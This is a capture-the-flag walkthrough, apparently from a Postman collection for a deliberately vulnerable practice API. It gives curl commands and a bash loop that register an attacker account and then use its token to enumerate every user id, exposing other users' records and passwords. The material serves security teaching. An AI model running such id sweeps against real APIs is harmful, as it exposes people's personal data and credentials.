			"description": "Excessive Data Exposure + Broken Authorization\r\n\r\nThis folder chains two OWASP API Top 10 categories through the same three endpoints: Create User, Post Comment, Get Comments, plus one authenticated endpoint, Get User. The whole chain fits comfortably under 10 requests because there are only five seeded users.\r\n\r\nAuthentication reuses the same scheme as API1: the `Authorization-Token` header is base64(username:password) for any registered API3 user. Like API1, the endpoint checks only that the credentials are valid, never that they belong to the id being requested -- that is the Broken Authorization half of this challenge.\r\n\r\n### Step 1 -- Register your own account\r\n```bash\r\ncurl -v -X POST https://{{host}}/vapi/api3/user \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"username\":\"attacker1\",\"name\":\"A\",\"password\":\"pw1\"}'\r\n```\r\nRunning this as the Create User request in Postman also sets `api3_auth` for the requests below.\r\n\r\n### Step 2 -- Read the comment feed\r\nA web frontend built against this endpoint would render `commenttext`, `username`, `latitude` and `longitude`, and ignore the rest. The raw response carries two fields it should not:\r\n```bash\r\ncurl -v https://{{host}}/vapi/api3/comment | python3 -m json.tool\r\n```\r\n- `deviceid` on the first comment is itself a flag (`flag{api3_...}`) -- the plain Excessive Data Exposure case, no further steps needed.\r\n- `user_id` on every comment is the internal numeric id of the comment's author. A comment feed has no reason to expose that id at all; a UI would only ever need the `username` it already carries. That id is this challenge's actual excessive-data-exposure finding, because it is what makes step 3 possible.\r\n\r\n### Step 3 -- Broken Authorization: read another user's record with your own token\r\n`GET api3/user/{id}` is authenticated, but not authorized: it accepts any valid Authorization-Token and returns whichever id you ask for, not only your own. Try your own id first, then every id you saw in the comment feed -- or simply sweep 1 through 5, since that is every user that exists:\r\n```bash\r\ntoken=$(printf 'attacker1:pw1' | base64)\r\nfor id in 1 2 3 4 5; do\r\n  echo \"id=$id:\"\r\n  curl -s https://{{host}}/vapi/api3/user/$id -H \"Authorization-Token: $token\"\r\n  echo\r\ndone\r\n```\r\nOne response returns a `course` field holding a second flag. The field itself -- a course name next to an authentication password, returned to a user who is not that account -- is Excessive Data Exposure again; the fact that any token can request any id is Broken Authorization. Total requests used so far: 1 (register) + 1 (read comments) + up to 5 (id sweep) = at most 7.\r\n\r\n### Post Comment, for completeness\r\n```bash\r\ncurl -v -X POST https://{{host}}/vapi/api3/comment \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"postid\":\"1\",\"deviceid\":\"whatever-a-client-app-would-send\",\"latitude\":\"0\",\"longitude\":\"0\",\"commenttext\":\"hi\",\"username\":\"attacker1\",\"user_id\":6}'\r\n```\r\nRe-run step 2 afterward: your own comment comes back carrying the same `user_id` field, confirming where the leak comes from.",
